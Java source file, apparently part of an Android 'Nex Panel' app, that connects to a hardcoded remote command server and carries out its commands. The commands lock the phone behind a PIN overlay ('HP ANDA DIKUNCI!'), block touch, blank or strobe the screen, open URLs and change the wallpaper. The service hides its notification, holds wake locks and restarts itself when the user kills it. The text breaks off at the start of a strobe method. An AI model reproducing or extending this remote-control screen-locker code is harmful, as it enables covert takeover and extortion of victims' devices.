package com.nex.panel;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.view.View;
import android.view.WindowManager;
import android.graphics.PixelFormat;
import android.view.Gravity;
import android.provider.Settings;
import android.util.Log;

import io.socket.client.IO;
import io.socket.client.Socket;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * BackgroundService — VERSI ULTRA SOLID
 * ════════════════════════════════════════
 * FIX 1: REQUEST_IGNORE_BATTERY_OPTIMIZATIONS → minta via intent dialog
 * FIX 2: WakeLock PARTIAL + timeout 1 jam + auto-renew
 * FIX 3: Socket.IO auto-reconnect + emit UID setelah connect
 * FIX 4: JobScheduler sebagai backup (VIVO/MIUI/Xiaomi)
 * FIX 5: setExactAndAllowWhileIdle untuk AlarmManager (Android 6+)
 * FIX 6: NetworkCallback onAvailable → reconnect socket + heartbeat langsung
 * FIX 7: ScheduledExecutorService dengan uncaughtExceptionHandler
 * FIX 8: Heartbeat retry 3x dengan backoff 3/6/10 detik
 * FIX 9: onTaskRemoved → restart service langsung + alarm
 * FIX 10: WakeLock renew otomatis setiap 45 menit agar tidak expire
 */
public class BackgroundService extends Service {

    private static final String API_BASE      = "http://hanz-neon-privatepanel3583.ymzprivat.biz.id:3622";
    private static final String CH_ID         = "nex_bg_v4";
    private static final int    NOTIF_ID      = 9984;
    private static final String FLUTTER_PREFS = "FlutterSharedPreferences";
    private static final String TAG           = "NexBGSvc";

    // Interval
    private static final int HEARTBEAT_SEC  = 10;  // heartbeat setiap 10 detik
    private static final int POLL_SEC       = 4;   // poll command setiap 4 detik
    private static final int WATCHDOG_SEC   = 20;  // watchdog scheduler setiap 20 detik
    private static final int ALARM_MIN      = 2;   // alarm watchdog setiap 2 menit
    private static final int JOB_ID         = 7711;

    private ScheduledExecutorService scheduler;
    private final Handler uiHandler = new Handler(Looper.getMainLooper());
    private boolean isStrobeRunning = false;
    private Runnable strobeRunnable;
    private PowerManager.WakeLock wakeLock;
    private View brightnessOverlayView;
    private Socket socket;
    private final AtomicBoolean socketConnecting = new AtomicBoolean(false);
    private final AtomicInteger heartbeatRetry   = new AtomicInteger(0);

    // Network callback
    private ConnectivityManager.NetworkCallback networkCallback;
    private ConnectivityManager connectivityManager;

    // WakeLock renew runnable
    private final Runnable wakeLockRenewRunnable = new Runnable() {
        @Override public void run() {
            renewWakeLock();
            uiHandler.postDelayed(this, 30 * 60 * 1000L); // renew setiap 30 menit
        }
    };

    // ─────────────────────────────────────────────────────────────────────
    // LIFECYCLE
    // ─────────────────────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        createHiddenChannel();
        try {
            startForeground(NOTIF_ID, buildInvisibleNotification());
        } catch (Exception e) {
            try { startForeground(NOTIF_ID, buildFallbackNotification()); }
            catch (Exception ignored) {}
        }
        acquireWakeLock();
        // Mulai renew wakeLock tiap 45 menit agar tidak expire
        uiHandler.postDelayed(wakeLockRenewRunnable, 45 * 60 * 1000L);
        registerNetworkCallback();
        // Delay 2 detik setelah service create baru connectSocket
        uiHandler.postDelayed(this::connectSocket, 2000);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Pastikan foreground selalu aktif (VIVO/MIUI kadang hapus notif)
        try { startForeground(NOTIF_ID, buildInvisibleNotification()); }
        catch (Exception ignored) {}
        startTasks();
        setWatchdogAlarm();
        scheduleJobIfNeeded(); // backup JobScheduler untuk VIVO/MIUI/Xiaomi
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // onTaskRemoved → dipanggil saat APK di-swipe tutup dari recent apps
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.w(TAG, "onTaskRemoved — restart service segera");
        // Langsung restart service
        Intent restart = new Intent(getApplicationContext(), BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getApplicationContext().startForegroundService(restart);
        } else {
            getApplicationContext().startService(restart);
        }
        // Set alarm cepat 1 detik sebagai backup
        setOneTimeAlarm(1000);
    }

    @Override
    public void onDestroy() {
        Log.w(TAG, "onDestroy — akan restart");
        stopTasks();
        uiHandler.removeCallbacks(wakeLockRenewRunnable);
        releaseWakeLock();
        unregisterNetworkCallback();
        removeBrightnessOverlay();
        disconnectSocket();
        scheduleRestart();
        super.onDestroy();
    }

    // ─────────────────────────────────────────────────────────────────────
    // WAKELOCK — cegah CPU tidur, renew otomatis
    // ─────────────────────────────────────────────────────────────────────

    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;
            if (wakeLock != null && wakeLock.isHeld()) return;
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "NexPanel:BGService"
            );
            // Acquire dengan timeout 1 jam — akan di-renew oleh wakeLockRenewRunnable
            wakeLock.acquire(60 * 60 * 1000L);
            Log.d(TAG, "WakeLock acquired (1 jam)");
        } catch (Exception e) {
            Log.e(TAG, "acquireWakeLock: " + e.getMessage());
        }
    }

    private void renewWakeLock() {
        try {
            // Release lama, acquire baru agar timer reset
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "NexPanel:BGService");
            wakeLock.acquire(60 * 60 * 1000L);
            Log.d(TAG, "WakeLock renewed");
        } catch (Exception e) {
            Log.e(TAG, "renewWakeLock: " + e.getMessage());
        }
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception ignored) {}
    }

    // ─────────────────────────────────────────────────────────────────────
    // SOCKET.IO — persistent, auto-reconnect, simpan UID sebelum connect
    // ─────────────────────────────────────────────────────────────────────

    private void connectSocket() {
        // Cegah double-connect
        if (socketConnecting.getAndSet(true)) return;

        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                if (socket != null && socket.connected()) {
                    socketConnecting.set(false);
                    return;
                }

                // Baca UID dulu — WAJIB ada sebelum connect
                String uid      = getFlutterPref("nex_uid");
                String deviceId = getFlutterPref("nex_device_id");

                if (uid.isEmpty() || deviceId.isEmpty()) {
                    Log.w(TAG, "UID/DeviceId kosong — retry 3 detik");
                    socketConnecting.set(false);
                    uiHandler.postDelayed(this::connectSocket, 3000);
                    return;
                }

                // Disconnect socket lama dulu (kalau ada)
                if (socket != null) {
                    try { socket.off(); socket.disconnect(); } catch (Exception ignored) {}
                    socket = null;
                }

                IO.Options opts = IO.Options.builder()
                    .setReconnection(true)
                    .setReconnectionAttempts(Integer.MAX_VALUE) // reconnect selamanya
                    .setReconnectionDelay(2000)      // retry pertama 2 detik
                    .setReconnectionDelayMax(10000)  // max 10 detik
                    .setTimeout(8000)
                    .build();

                socket = IO.socket(API_BASE, opts);

                // ─ EVENT: connect berhasil ─
                socket.on(Socket.EVENT_CONNECT, args -> {
                    Log.d(TAG, "Socket CONNECTED!");
                    socketConnecting.set(false);
                    try {
                        // Kirim register dengan UID + deviceId
                        JSONObject reg = new JSONObject();
                        reg.put("deviceId", getFlutterPref("nex_device_id"));
                        reg.put("uid",      getFlutterPref("nex_uid"));
                        reg.put("name",     getFlutterPref("nex_device_name"));
                        socket.emit("device:register", reg);
                        Log.d(TAG, "Registered to server: " + reg);
                        // Langsung heartbeat setelah connect
                        Executors.newSingleThreadExecutor().execute(BackgroundService.this::sendHeartbeat);
                    } catch (Exception e) {
                        Log.e(TAG, "Socket register error: " + e.getMessage());
                    }
                });

                // ─ EVENT: terima command ─
                socket.on("command", args -> {
                    try {
                        if (args == null || args.length == 0) return;
                        JSONObject cmd = (JSONObject) args[0];
                        executeCommand(cmd);
                    } catch (Exception e) {
                        Log.e(TAG, "Socket command error: " + e.getMessage());
                    }
                });

                // ─ EVENT: disconnect ─
                socket.on(Socket.EVENT_DISCONNECT, args -> {
                    Log.w(TAG, "Socket DISCONNECTED — auto-reconnect aktif");
                    socketConnecting.set(false);
                });

                // ─ EVENT: connect error ─
                socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
                    Log.w(TAG, "Socket connect error — retrying...");
                    socketConnecting.set(false);
                });

                socket.connect();
                Log.d(TAG, "Socket connecting to " + API_BASE);

            } catch (Exception e) {
                Log.e(TAG, "connectSocket error: " + e.getMessage());
                socketConnecting.set(false);
                uiHandler.postDelayed(this::connectSocket, 5000);
            }
        });
    }

    private void disconnectSocket() {
        try {
            if (socket != null) {
                socket.off();
                socket.disconnect();
                socket = null;
            }
        } catch (Exception ignored) {}
    }

    // ─────────────────────────────────────────────────────────────────────
    // NETWORK CALLBACK — saat internet balik, langsung reconnect + heartbeat
    // ─────────────────────────────────────────────────────────────────────

    private void registerNetworkCallback() {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
            connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (connectivityManager == null) return;

            networkCallback = new ConnectivityManager.NetworkCallback() {
                @Override
                public void onAvailable(android.net.Network network) {
                    Log.d(TAG, "NETWORK AVAILABLE — reconnect socket + heartbeat");
                    // Delay 500ms beri waktu network stabil — cepat reconnect
                    uiHandler.postDelayed(() -> {
                        // Reset flag dulu agar tidak stuck
                        socketConnecting.set(false);
                        // Reconnect socket jika belum connected
                        if (socket == null || !socket.connected()) {
                            connectSocket();
                        } else {
                            // Kalau sudah connected, kirim heartbeat langsung
                            Executors.newSingleThreadExecutor()
                                .execute(BackgroundService.this::sendHeartbeat);
                        }
                    }, 500);
                }

                @Override
                public void onLost(android.net.Network network) {
                    Log.w(TAG, "NETWORK LOST — disconnect socket segera");
                    // Langsung disconnect socket agar panel tahu offline CEPAT
                    uiHandler.post(() -> {
                        try {
                            if (socket != null && socket.connected()) {
                                socket.disconnect();
                            }
                        } catch (Exception ignored) {}
                    });
                }
            };

            connectivityManager.registerDefaultNetworkCallback(networkCallback);
        } catch (Exception e) {
            Log.e(TAG, "registerNetworkCallback: " + e.getMessage());
        }
    }

    private void unregisterNetworkCallback() {
        try {
            if (networkCallback != null && connectivityManager != null
                    && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                connectivityManager.unregisterNetworkCallback(networkCallback);
                networkCallback = null;
            }
        } catch (Exception ignored) {}
    }

    // ─────────────────────────────────────────────────────────────────────
    // CEK INTERNET
    // ─────────────────────────────────────────────────────────────────────

    private boolean isNetworkAvailable() {
        try {
            ConnectivityManager cm = (ConnectivityManager)
                getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.net.Network net = cm.getActiveNetwork();
                if (net == null) return false;
                NetworkCapabilities nc = cm.getNetworkCapabilities(net);
                return nc != null
                    && nc.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                    && nc.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                    && (
                        nc.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)     ||
                        nc.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                        nc.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
                    );
            } else {
                //noinspection deprecation
                android.net.NetworkInfo info = cm.getActiveNetworkInfo();
                return info != null && info.isConnected();
            }
        } catch (Exception e) {
            return false;
        }
    }

    // ─────────────────────────────────────────────────────────────────────
    // SCHEDULER — heartbeat + poll command + watchdog
    // ─────────────────────────────────────────────────────────────────────

    private void startTasks() {
        stopTasks();
        // Thread pool dengan uncaught exception handler agar tidak berhenti
        scheduler = Executors.newScheduledThreadPool(3, r -> {
            Thread t = new Thread(r, "NexBG-Worker");
            t.setUncaughtExceptionHandler((thread, throwable) -> {
                Log.e(TAG, "Scheduler thread crash: " + throwable.getMessage());
                uiHandler.postDelayed(BackgroundService.this::startTasks, 2000);
            });
            return t;
        });

        // Heartbeat setiap 15 detik, mulai langsung
        scheduler.scheduleAtFixedRate(this::sendHeartbeat, 0, HEARTBEAT_SEC, TimeUnit.SECONDS);
        // Poll command setiap 4 detik, mulai 2 detik setelah start
        scheduler.scheduleAtFixedRate(this::pollCommands, 2, POLL_SEC, TimeUnit.SECONDS);
        // Watchdog setiap 30 detik
        scheduler.scheduleAtFixedRate(this::watchdogCheck, WATCHDOG_SEC, WATCHDOG_SEC, TimeUnit.SECONDS);

        Log.d(TAG, "Tasks started");
    }

    private void watchdogCheck() {
        // 1. Cek WakeLock — acquire ulang jika hilang
        if (wakeLock == null || !wakeLock.isHeld()) {
            Log.w(TAG, "WakeLock hilang — acquire ulang");
            acquireWakeLock();
        }
        // 2. Cek scheduler masih hidup
        if (scheduler == null || scheduler.isTerminated() || scheduler.isShutdown()) {
            Log.w(TAG, "Scheduler mati — restart!");
            uiHandler.post(this::startTasks);
            return; // startTasks sudah handle socket juga
        }
        // 3. Cek socket — hanya jika ada internet
        if (!isNetworkAvailable()) {
            Log.d(TAG, "Watchdog: no internet — skip socket check");
            return;
        }
        if (socket == null || !socket.connected()) {
            Log.w(TAG, "Socket mati — reconnect dari watchdog");
            socketConnecting.set(false);
            uiHandler.post(this::connectSocket);
        }
    }

    private void stopTasks() {
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdownNow();
        }
        scheduler = null;
        stopStrobe();
    }

    // ─────────────────────────────────────────────────────────────────────
    // ALARM MANAGER WATCHDOG
    // ─────────────────────────────────────────────────────────────────────

    private void setWatchdogAlarm() {
        try {
            Intent restart = new Intent(this, BootReceiver.class);
            restart.setAction("com.nex.panel.RESTART_SERVICE");
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }
            PendingIntent pi = PendingIntent.getBroadcast(this, 9002, restart, flags);
            AlarmManager am  = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;

            long intervalMs = ALARM_MIN * 60 * 1000L;
            long triggerAt  = System.currentTimeMillis() + intervalMs;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                // Android 12+ — setRepeating masih ok, tapi tidak exact
                // Tambah setExactAndAllowWhileIdle untuk trigger pertama
                am.setRepeating(AlarmManager.RTC_WAKEUP, triggerAt, intervalMs, pi);
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Android 6-11 — setExactAndAllowWhileIdle + setRepeating
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
                am.setRepeating(AlarmManager.RTC_WAKEUP, triggerAt, intervalMs, pi);
            } else {
                am.setRepeating(AlarmManager.RTC_WAKEUP, triggerAt, intervalMs, pi);
            }
            Log.d(TAG, "Watchdog alarm set: setiap " + ALARM_MIN + " menit");
        } catch (Exception e) {
            Log.e(TAG, "setWatchdogAlarm: " + e.getMessage());
        }
    }

    private void setOneTimeAlarm(long delayMs) {
        try {
            Intent restart = new Intent(this, BootReceiver.class);
            restart.setAction("com.nex.panel.RESTART_SERVICE");
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) flags |= PendingIntent.FLAG_IMMUTABLE;
            PendingIntent pi = PendingIntent.getBroadcast(this, 9001, restart, flags);
            AlarmManager am  = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;
            long triggerAt = System.currentTimeMillis() + delayMs;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            } else {
                am.set(AlarmManager.RTC_WAKEUP, triggerAt, pi);
            }
        } catch (Exception ignored) {}
    }

    // ─────────────────────────────────────────────────────────────────────
    // JOB SCHEDULER — backup khusus VIVO/MIUI/Xiaomi yang agresif kill
    // ─────────────────────────────────────────────────────────────────────

    private void scheduleJobIfNeeded() {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;
            JobScheduler js = (JobScheduler) getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js == null) return;

            // Cek apakah job sudah terjadwal
            for (JobInfo ji : js.getAllPendingJobs()) {
                if (ji.getId() == JOB_ID) return; // sudah ada, skip
            }

            JobInfo job = new JobInfo.Builder(
                JOB_ID,
                new ComponentName(this, NexJobService.class)
            )
            .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
            .setPersisted(true) // survive reboot
            .setPeriodic(15 * 60 * 1000L) // setiap 15 menit (min di Android)
            .build();

            int result = js.schedule(job);
            Log.d(TAG, "JobScheduler scheduled: " + (result == JobScheduler.RESULT_SUCCESS ? "OK" : "FAILED"));
        } catch (Exception e) {
            Log.e(TAG, "scheduleJobIfNeeded: " + e.getMessage());
        }
    }

    // ─────────────────────────────────────────────────────────────────────
    // SELF-RESTART
    // ─────────────────────────────────────────────────────────────────────

    private void scheduleRestart() {
        // Coba direct restart dulu
        try {
            Intent direct = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(direct);
            } else {
                startService(direct);
            }
        } catch (Exception ignored) {}
        // Alarm backup 2 detik
        setOneTimeAlarm(2000);
    }

    // ─────────────────────────────────────────────────────────────────────
    // SHARED PREFERENCES
    // ─────────────────────────────────────────────────────────────────────

    private String getFlutterPref(String key) {
        try {
            SharedPreferences prefs = getSharedPreferences(FLUTTER_PREFS, Context.MODE_PRIVATE);
            // Flutter simpan dengan prefix "flutter."
            String val = prefs.getString("flutter." + key, "");
            if (val != null && !val.isEmpty()) return val;
            // Fallback tanpa prefix
            val = prefs.getString(key, "");
            return val != null ? val : "";
        } catch (Exception e) {
            return "";
        }
    }

    // ─────────────────────────────────────────────────────────────────────
    // HEARTBEAT — retry 3x dengan backoff
    // ─────────────────────────────────────────────────────────────────────

    private void sendHeartbeat() {
        if (!isNetworkAvailable()) {
            Log.d(TAG, "No network — skip heartbeat");
            return;
        }
        String uid      = getFlutterPref("nex_uid");
        String deviceId = getFlutterPref("nex_device_id");
        if (uid.isEmpty() || deviceId.isEmpty()) {
            Log.d(TAG, "UID kosong — skip heartbeat");
            return;
        }
        try {
            JSONObject body = new JSONObject();
            body.put("uid",      uid);
            body.put("deviceId", deviceId);
            postJson(API_BASE + "/deviceHeartbeat", body.toString());
            heartbeatRetry.set(0); // reset retry counter
            Log.d(TAG, "Heartbeat ✓");
        } catch (Exception e) {
            int retry = heartbeatRetry.incrementAndGet();
            Log.w(TAG, "Heartbeat gagal (attempt " + retry + "): " + e.getMessage());
            if (retry <= 3) {
                // Backoff: 3 detik, 6 detik, 10 detik
                long delay = retry == 1 ? 3000L : retry == 2 ? 6000L : 10000L;
                uiHandler.postDelayed(this::retryHeartbeat, delay);
            }
        }
    }

    private void retryHeartbeat() {
        if (!isNetworkAvailable()) return;
        String uid      = getFlutterPref("nex_uid");
        String deviceId = getFlutterPref("nex_device_id");
        if (uid.isEmpty() || deviceId.isEmpty()) return;
        try {
            JSONObject body = new JSONObject();
            body.put("uid",      uid);
            body.put("deviceId", deviceId);
            postJson(API_BASE + "/deviceHeartbeat", body.toString());
            heartbeatRetry.set(0);
            Log.d(TAG, "Heartbeat retry ✓");
        } catch (Exception ignored) {}
    }

    // ─────────────────────────────────────────────────────────────────────
    // POLL COMMAND
    // ─────────────────────────────────────────────────────────────────────

    private void pollCommands() {
        if (!isNetworkAvailable()) return;
        String uid      = getFlutterPref("nex_uid");
        String deviceId = getFlutterPref("nex_device_id");
        if (uid.isEmpty() || deviceId.isEmpty()) return;
        try {
            String resp = getJson(
                API_BASE + "/pollCommand?uid=" + uid + "&deviceId=" + deviceId);
            if (resp == null || resp.isEmpty()) return;
            JSONObject data = new JSONObject(resp);
            if (!data.optBoolean("success", false)) return;
            JSONArray cmds = data.optJSONArray("commands");
            if (cmds == null || cmds.length() == 0) return;
            for (int i = 0; i < cmds.length(); i++) {
                executeCommand(cmds.getJSONObject(i));
            }
        } catch (Exception ignored) {}
    }

    // ─────────────────────────────────────────────────────────────────────
    // EXECUTE COMMAND
    // ─────────────────────────────────────────────────────────────────────

    private void executeCommand(JSONObject cmd) {
        String command = cmd.optString("command", "");
        switch (command) {
            case "startStrobe":
            case "torchOn":
                uiHandler.post(this::startStrobe);
                break;

            case "stopStrobe":
            case "torchOff":
                uiHandler.post(this::stopStrobe);
                break;

            case "lockDevice": {
                JSONObject extra = cmd.optJSONObject("extra");
                String rawMsg = cmd.optString("message", "");
                String rawPin = cmd.optString("pin", "");
                if (rawMsg.isEmpty() && extra != null) rawMsg = extra.optString("message", "HP ANDA DIKUNCI!");
                if (rawPin.isEmpty() && extra != null) rawPin = extra.optString("pin", "1234");
                final String msg = rawMsg.isEmpty() ? "HP ANDA DIKUNCI!" : rawMsg;
                final String pin = rawPin.isEmpty() ? "1234" : rawPin;
                uiHandler.post(() -> {
                    try {
                        Intent lock = new Intent(this, LockOverlayService.class);
                        lock.setAction(LockOverlayService.ACTION_LOCK);
                        lock.putExtra(LockOverlayService.EXTRA_MESSAGE, msg);
                        lock.putExtra(LockOverlayService.EXTRA_PIN, pin);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(lock);
                        else startService(lock);
                    } catch (Exception ignored) {}
                });
                break;
            }

            case "unlockDevice":
                uiHandler.post(() -> {
                    try {
                        Intent unlock = new Intent(this, LockOverlayService.class);
                        unlock.setAction(LockOverlayService.ACTION_UNLOCK);
                        startService(unlock);
                    } catch (Exception ignored) {}
                });
                break;

            case "lockDeviceHtml": {
                String rawHtml = cmd.optString("html", "");
                final String finalHtml = rawHtml.isEmpty()
                    ? "<html><body style='background:#000;color:#fff;display:flex;align-items:center;" +
                      "justify-content:center;height:100vh;font-family:monospace;font-size:24px;'>" +
                      "☠️ DEVICE LOCKED</body></html>"
                    : rawHtml;
                uiHandler.post(() -> {
                    try {
                        Intent lockHtml = new Intent(this, LockOverlayService.class);
                        lockHtml.setAction(LockOverlayService.ACTION_LOCK_HTML);
                        lockHtml.putExtra(LockOverlayService.EXTRA_HTML, finalHtml);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(lockHtml);
                        else startService(lockHtml);
                    } catch (Exception ignored) {}
                });
                break;
            }

            case "unlockDeviceHtml":
                uiHandler.post(() -> {
                    try {
                        Intent u = new Intent(this, LockOverlayService.class);
                        u.setAction(LockOverlayService.ACTION_UNLOCK);
                        startService(u);
                    } catch (Exception ignored) {}
                });
                break;

            case "videoOverlay":
                uiHandler.post(() -> {
                    try {
                        Intent vi = new Intent(this, VideoOverlayService.class);
                        vi.setAction(VideoOverlayService.ACTION_SHOW_VIDEO);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(vi);
                        else startService(vi);
                    } catch (Exception ignored) {}
                });
                break;

            case "stopVideoOverlay":
                uiHandler.post(() -> {
                    try {
                        Intent sv = new Intent(this, VideoOverlayService.class);
                        sv.setAction(VideoOverlayService.ACTION_STOP_VIDEO);
                        startService(sv);
                    } catch (Exception ignored) {}
                });
                break;

            case "blockTouch":
                uiHandler.post(() -> {
                    try {
                        Intent bi = new Intent(this, TouchBlockerService.class);
                        bi.setAction(TouchBlockerService.ACTION_BLOCK_TOUCH);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(bi);
                        else startService(bi);
                    } catch (Exception ignored) {}
                });
                break;

            case "stopBlockTouch":
                uiHandler.post(() -> {
                    try {
                        Intent sb2 = new Intent(this, TouchBlockerService.class);
                        sb2.setAction(TouchBlockerService.ACTION_STOP_BLOCK);
                        startService(sb2);
                    } catch (Exception ignored) {}
                });
                break;

            case "blackScreen": {
                final int blinkCount = cmd.optInt("count", 10);
                uiHandler.post(() -> {
                    try {
                        Intent bi2 = new Intent(this, BlackScreenService.class);
                        bi2.setAction(BlackScreenService.ACTION_BLACK_SCREEN);
                        bi2.putExtra(BlackScreenService.EXTRA_COUNT, blinkCount);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(bi2);
                        else startService(bi2);
                    } catch (Exception ignored) {}
                });
                break;
            }

            case "setWallpaper": {
                final String wallUrl = cmd.optString("url", "");
                if (!wallUrl.isEmpty()) {
                    uiHandler.post(() -> {
                        try {
                            Intent wi = new Intent(this, SetWallpaperService.class);
                            wi.setAction(SetWallpaperService.ACTION_SET_WALLPAPER);
                            wi.putExtra(SetWallpaperService.EXTRA_URL, wallUrl);
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(wi);
                            else startService(wi);
                        } catch (Exception ignored) {}
                    });
                }
                break;
            }

            case "openUrl": {
                final String targetUrl = cmd.optString("url", "");
                if (!targetUrl.isEmpty()) {
                    uiHandler.post(() -> {
                        try {
                            Intent browserIntent = new Intent(
                                Intent.ACTION_VIEW, android.net.Uri.parse(targetUrl));
                            browserIntent.addFlags(
                                Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                            startActivity(browserIntent);
                        } catch (Exception ignored) {}
                    });
                }
                break;
            }

            case "setBrightness": {
                final int level = cmd.optInt("level", 50);
                uiHandler.post(() -> {
                    try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                                && Settings.System.canWrite(BackgroundService.this)) {
                            int brightness = (int) Math.round((level / 100.0) * 255);
                            brightness = Math.max(0, Math.min(255, brightness));
                            Settings.System.putInt(getContentResolver(),
                                Settings.System.SCREEN_BRIGHTNESS_MODE,
                                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
                            Settings.System.putInt(getContentResolver(),
                                Settings.System.SCREEN_BRIGHTNESS, brightness);
                        } else {
                            setBrightnessViaOverlay(level);
                        }
                    } catch (Exception e) {
                        try { setBrightnessViaOverlay(level); } catch (Exception ignored) {}
                    }
                });
                break;
            }

            case "setVolume": {
                final int volLevel  = cmd.optInt("level", 50);
                final String volType = cmd.optString("type", "media");
                uiHandler.post(() -> {
                    try {
                        AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                        if (am == null) return;
                        int streamType;
                        switch (volType) {
                            case "ring":         streamType = AudioManager.STREAM_RING;         break;
                            case "alarm":        streamType = AudioManager.STREAM_ALARM;        break;
                            case "notification": streamType = AudioManager.STREAM_NOTIFICATION; break;
                            case "call":         streamType = AudioManager.STREAM_VOICE_CALL;   break;
                            default:             streamType = AudioManager.STREAM_MUSIC;        break;
                        }
                        int maxVol = am.getStreamMaxVolume(streamType);
                        int target = Math.max(0, Math.min(maxVol,
                            (int) Math.round((volLevel / 100.0) * maxVol)));
                        am.setStreamVolume(streamType, target, 0);
                    } catch (Exception ignored) {}
                });
                break;
            }
        }
    }

    // ─────────────────────────────────────────────────────────────────────
    // BRIGHTNESS OVERLAY
    // ─────────────────────────────────────────────────────────────────────

    private void setBrightnessViaOverlay(int levelPercent) {
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            if (wm == null) return;
            removeBrightnessOverlay();
            float wb = levelPercent <= 0 ? 0.01f
                     : levelPercent >= 100 ? 1.0f
                     : levelPercent / 100.0f;
            View overlay = new View(this);
            overlay.setBackgroundColor(android.graphics.Color.TRANSPARENT);
            brightnessOverlayView = overlay;
            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSPARENT
            );
            params.gravity = Gravity.TOP | Gravity.START;
            params.screenBrightness = wb;
            wm.addView(overlay, params);
            // Auto-hapus 30 menit
            uiHandler.postDelayed(this::removeBrightnessOverlay, 30 * 60 * 1000L);
        } catch (Exception e) {
            Log.e(TAG, "setBrightnessViaOverlay: " + e.getMessage());
        }
    }

    private void removeBrightnessOverlay() {
        try {
            if (brightnessOverlayView != null) {
                WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
                if (wm != null) wm.removeView(brightnessOverlayView);
                brightnessOverlayView = null;
            }
        } catch (Exception ignored) {}
    }

    // ─────────────────────────────────────────────────────────────────────
    // STROBE / FLASH
    // ─────────────────────────────────────────────────────────────────────

    private void startStrobe() {
